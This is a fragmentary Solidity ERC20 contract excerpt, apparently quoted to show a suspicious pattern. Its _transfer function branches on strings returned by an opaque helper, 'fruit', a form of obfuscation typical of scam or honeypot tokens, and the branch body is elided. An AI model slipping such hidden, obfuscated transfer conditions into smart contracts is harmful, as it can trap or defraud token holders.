...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    function _transfer(
        ...
        (string memory b2, string memory c2) = fruit(5470,4120);
        if (keccak256(abi.encodePacked(b2))==keccak256(abi.encodePacked("apple")) || 
            keccak256(abi.encodePacked(c2))==keccak256(abi.encodePacked("pair")) ) {
    ...
    function fruit(uint64 a0, uint64 a1) private pure 
    returns(string memory _b0, string memory c0_) {
        if (a0 == 1 && a1 == 1) return ("orange", "strawberry");
